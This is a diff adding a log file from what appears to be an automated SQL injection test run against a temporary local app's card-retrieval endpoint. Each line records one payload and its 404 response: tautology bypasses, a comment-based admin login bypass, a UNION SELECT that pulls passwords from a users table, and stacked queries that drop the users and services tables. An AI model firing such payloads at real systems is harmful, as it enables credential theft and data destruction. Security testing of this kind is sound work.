@@ -1,0 +1,27 @@
+2026-11-09 09:40:03,787 - /tmp/app_7lldcpgb - WARNING - POST /retreive_cards ['1-800-123', '1-800-456', '1-800-789'] not found: 404 NOT FOUND
+2026-11-09 09:40:03,792 - /tmp/app_7lldcpgb - INFO - trying vector: 1') OR '1'='1' --, got 404 {"message":"Not found"}
+
+2026-11-09 09:40:03,795 - /tmp/app_7lldcpgb - INFO - trying vector: 1') OR TRUE --, got 404 {"message":"Not found"}
+
+2026-11-09 09:40:03,797 - /tmp/app_7lldcpgb - INFO - trying vector: ') OR TRUE --, got 404 {"message":"Not found"}
+
+2026-11-09 09:40:03,799 - /tmp/app_7lldcpgb - INFO - trying vector: 1') OR '1'='1' OR ?=1 --, got 404 {"message":"Not found"}
+
+2026-11-09 09:40:03,801 - /tmp/app_7lldcpgb - INFO - trying vector: 1) OR '1'='1' --, got 404 {"message":"Not found"}
+
+2026-11-09 09:40:03,803 - /tmp/app_7lldcpgb - INFO - trying vector: user1@example.com' OR '1'='1, got 404 {"message":"Not found"}
+
+2026-11-09 09:40:03,804 - /tmp/app_7lldcpgb - INFO - trying vector: 1 OR '1'='1', got 404 {"message":"Not found"}
+
+2026-11-09 09:40:03,806 - /tmp/app_7lldcpgb - INFO - trying vector: admin'--, got 404 {"message":"Not found"}
+
+2026-11-09 09:40:03,808 - /tmp/app_7lldcpgb - INFO - trying vector: user2@example.com') UNION SELECT password FROM users --, got 404 {"message":"Not found"}
+
+2026-11-09 09:40:03,810 - /tmp/app_7lldcpgb - INFO - trying vector: user2@example.com') UNION SELECT password FROM users --, got 404 {"message":"Not found"}
+
+2026-11-09 09:40:03,812 - /tmp/app_7lldcpgb - INFO - trying vector: anything" OR ""=", got 404 {"message":"Not found"}
+
+2026-11-09 09:40:03,814 - /tmp/app_7lldcpgb - INFO - trying vector: '; DROP TABLE users; --, got 404 {"message":"Not found"}
+
+2026-11-09 09:40:03,816 - /tmp/app_7lldcpgb - INFO - trying vector: '; DROP TABLE services; --, got 404 {"message":"Not found"}
+
